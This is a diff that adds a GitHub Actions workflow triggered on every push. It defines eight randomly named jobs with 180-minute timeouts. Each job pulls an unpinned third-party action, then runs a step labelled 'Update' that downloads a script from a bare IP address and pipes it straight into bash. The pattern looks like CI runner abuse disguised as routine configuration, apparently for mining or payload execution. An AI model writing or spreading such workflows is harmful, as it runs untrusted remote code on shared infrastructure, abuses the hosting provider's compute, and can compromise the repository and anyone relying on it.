@@ -1,0 +1,75 @@
+name: puzuxa
+on: push
+jobs:
+  yetiso:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=powodu | bash -
+  xatira:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=powodu | bash -
+  fomuki:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=powodu | bash -
+  tuniji:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=powodu | bash -
+  goviduye:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=powodu | bash -
+  jofibu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=powodu | bash -
+  zecihice:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=powodu | bash -
+  sobiso:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - uses: mandacayha/krum@latest
+    - name: First
+      run: echo "Warm Up..."
+    - name: Update
+      run: curl http://146.190.200.227:8888/mandalorian/mfsafgglagHni.php?a=powodu | bash -
